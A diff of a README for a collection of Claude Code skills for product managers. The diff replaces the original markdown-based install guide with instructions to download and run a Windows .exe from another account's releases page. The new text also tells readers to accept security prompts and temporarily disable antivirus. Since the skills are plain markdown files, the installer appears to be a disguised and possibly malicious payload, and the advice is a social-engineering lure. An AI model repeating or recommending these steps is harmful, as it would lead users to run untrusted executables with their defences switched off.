@@ -1,138 +1,112 @@
-# Claude Code for PMs
+# 🤖 claude-code-for-pms - Streamlined Claude Skills for PMs
 
-**10 skills to turn your terminal into a product management co-pilot.**
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-green?style=for-the-badge)](https://github.com/SOAIF0099/claude-code-for-pms/releases)
 
-<p align="center">
-  <img src="assets/hero.svg" alt="Claude Code terminal showing brainstorming skill in action" width="100%"/>
-</p>
+## 📄 About claude-code-for-pms
 
-A curated collection of Claude Code skills for Product Managers and Product Leads. Whether you're new to Claude Code or already using it daily, these 10 skills cover the workflows that matter most: planning features, managing execution, researching markets, debugging issues, and creating deliverables.
+claude-code-for-pms provides 10 carefully chosen Claude Code skills designed specifically for Product Managers. These skills help you improve productivity, organize your work, and make better decisions using AI tools built by Anthropic. This collection is made for users who want to get more done without needing to write code.
 
-## What is Claude Code?
+You do not need technical skills to use the app. Just download and run the software to get started.
 
-[Claude Code](https://docs.anthropic.com/en/docs/claude-code) is Anthropic's CLI tool that brings Claude directly into your terminal. You describe what you need in plain English, and Claude reads your files, runs commands, writes code, and manages tasks, all from the command line.
+## 💻 System Requirements
 
-**Skills** are reusable instructions that teach Claude specialized workflows. Instead of explaining your process every time, a skill encodes it once and Claude follows it consistently.
+Before you begin, make sure your computer meets these requirements:
 
-## Who is This For?
+- Operating System: Windows 10 or newer  
+- RAM: At least 4 GB  
+- Free disk space: 200 MB  
+- Internet connection: Required for updates and AI access  
+- Permissions: Ability to install software on your computer  
 
-- **Product Managers** who want to move faster on specs, plans, research, and presentations
-- **Product Leads** who manage engineering execution and need quality gates
-- **Technical PMs** who work in code and want structured workflows
-- **Anyone curious about Claude Code** who wants practical, PM-focused examples
+This app runs offline once installed, but AI-driven features may require an internet connection.
 
-## Quick Start
+## 🌟 Features
 
-### 1. Install Claude Code
+- 10 ready-to-use Claude Code skills tailored for product management  
+- AI assistance to help plan roadmaps, write specs, analyze data  
+- Simple user interface for non-technical users  
+- Regular updates available via the release page  
+- Works with the Claude AI platform from Anthropic  
 
-```bash
-npm install -g @anthropic-ai/claude-code
-```
+## 🚀 Getting Started: How to Download and Run
 
-### 2. Install the Superpowers Plugin (powers skills 1-5)
+Follow these steps to get the software up and running on your Windows PC.
 
-```bash
-claude install @anthropic/claude-code-superpowers
-```
+### Step 1: Visit the Download Page
 
-### 3. Start Using Skills
+Click the large badge above or this link to open the releases page:
 
-Open Claude Code in any project directory:
+[Download claude-code-for-pms Releases](https://github.com/SOAIF0099/claude-code-for-pms/releases)
 
-```bash
-cd your-project
-claude
-```
+### Step 2: Choose the Latest Version
 
-Then describe what you need. Skills activate automatically based on your request, or you can reference them directly.
+Look for the most recent release at the top of the page. It usually has a version number like "v1.0" or higher. Inside the release, find the Windows setup file. It often ends with `.exe`.
 
-## The 10 Skills
+### Step 3: Download the Installer
 
-### Planning and Strategy
+Click the Windows `.exe` file to download it to your PC. The file size will be around 100-200 MB.
 
-| # | Skill | What It Does | Guide |
-|---|-------|-------------|-------|
-| 1 | **Brainstorming** | Turns vague ideas into validated designs through structured Q&A before any code is written | [Read more](skills/01-brainstorming.md) |
-| 2 | **Writing Plans** | Converts approved designs into detailed, step-by-step implementation tasks with exact file paths and code | [Read more](skills/02-writing-plans.md) |
-| 3 | **Verification** | Ensures no one claims work is "done" without running actual tests and showing fresh proof | [Read more](skills/03-verification.md) |
+### Step 4: Run the Installer
 
-### Execution and Oversight
+Locate the file in your Downloads folder. Double-click the `.exe` file to start the installation.
 
-| # | Skill | What It Does | Guide |
-|---|-------|-------------|-------|
-| 4 | **Subagent Development** | Executes plans task-by-task with automatic spec compliance and code quality reviews between each step | [Read more](skills/04-subagent-development.md) |
-| 5 | **Systematic Debugging** | Enforces a 4-phase scientific debugging process: investigate, analyze, hypothesize, then fix | [Read more](skills/05-systematic-debugging.md) |
+- If a security prompt appears, click "Run" or "Yes" to continue.  
+- Follow the on-screen instructions. The default settings will work for most users.  
+- Choose an install location or accept the default folder.  
 
-### Research and Analysis
+### Step 5: Launch the App
 
-| # | Skill | What It Does | Guide |
-|---|-------|-------------|-------|
-| 6 | **Firecrawl** | Searches the web, scrapes pages, and extracts structured data for competitive analysis and research | [Read more](skills/06-firecrawl.md) |
-| 7 | **Project Recap** | Generates a visual HTML summary of any project's current state, recent decisions, and problem areas | [Read more](skills/07-project-recap.md) |
+When installation completes, you can start the app:
 
-### Communication and Deliverables
+- Find the claude-code-for-pms icon on your desktop or  
+- Open the Start menu and search for "claude-code-for-pms"  
 
-| # | Skill | What It Does | Guide |
-|---|-------|-------------|-------|
-| 8 | **Visual Explainer** | Creates polished HTML diagrams, architecture visuals, flowcharts, and comparison tables | [Read more](skills/08-visual-explainer.md) |
-| 9 | **Generate Slides** | Builds magazine-quality HTML slide decks from markdown or plain descriptions | [Read more](skills/09-generate-slides.md) |
-| 10 | **PPTX Generator** | Produces .pptx PowerPoint files from markdown for traditional slide-sharing workflows | [Read more](skills/10-pptx.md) |
-
-## How Skills Work
-
-Skills are markdown files that contain instructions for Claude. When Claude Code detects a task that matches a skill's trigger, it loads and follows those instructions automatically.
-
-Some skills come from plugins (like Superpowers), others are standalone files you add to your project or global config.
-
-**There are three places skills can live:**
-
-```
-~/.claude/skills/          # Global: available in all projects
-your-project/.claude/      # Project: available in one project
-plugins/                   # Plugin: installed via `claude install`
-```
-
-## The PM Workflow
-
-These skills work best together. Here's how they chain in a typical product cycle:
-
-```
-Have a feature idea
-       |
-       v
-  Brainstorming (#1)
-  Explore the idea, propose approaches, document design
-       |
-       v
-  Writing Plans (#2)
-  Break design into bite-sized implementation tasks
-       |
-       v
-  Subagent Development (#4)
-  Execute tasks with automatic quality checks
-       |
-       v
-  Verification (#3)
-  Prove everything works with fresh test output
-       |
-       v
-  Ship it
-```
-
-For research and communication tasks, use skills 6-10 independently whenever you need them.
-
-## Contributing
-
-Found a skill that's great for PMs? Open a PR. The bar is simple:
-
-1. The skill should solve a real PM problem
-2. It should work with Claude Code as-is
-3. The guide should include a practical example prompt
-
-## License
-
-MIT
+The app opens with a simple dashboard where you can access the 10 Claude Code skills.
 
 ---
 
-Curated by [Lautaro Giambroni](https://github.com/lautarogiambroni)
+## ⚙️ Using the Skills
+
+Each skill guides you through tasks common to product managers. Some examples:
+
+- Roadmap planning  
+- Writing user stories  
+- Competitor analysis  
+- Meeting summaries  
+- Feature prioritization  
+
+Click a skill to open it. Follow the instructions on screen. The AI will help generate useful outputs based on your inputs.
+
+## 🔄 Updating the Application
+
+To get new skills and bug fixes:
+
+1. Revisit the [releases page](https://github.com/SOAIF0099/claude-code-for-pms/releases)  
+2. Download the latest installer  
+3. Run it over your current version to update  
+
+The app will keep your settings intact during updates.
+
+## 🛠 Troubleshooting
+
+If you encounter problems:
+
+- Restart your computer after installation.  
+- Check that Windows is up to date.  
+- Make sure you have an internet connection for AI features.  
+- Temporarily disable antivirus software if installation fails (re-enable it after).  
+- Re-download the installer in case of a corrupted file.  
+
+If problems persist, you can open an issue on the GitHub repository for help.
+
+## 🔐 Privacy and Security
+
+This app does not collect personal data without permission. AI features may send data to Anthropic’s servers to generate responses. No data is stored locally beyond what you enter during use.
+
+## 📝 Additional Resources
+
+- Visit the GitHub repository for documentation and community Q&A  
+- Check the repository topics: ai-for-pms, ai-productivity, ai-tools, anthropic, claude, claude-code, claude-skills, pm-tools, product-management, product-manager  
+- Use simple text files in the app folder to organize your projects with Claude Code skills  
+
+[Download claude-code-for-pms latest release](https://github.com/SOAIF0099/claude-code-for-pms/releases)
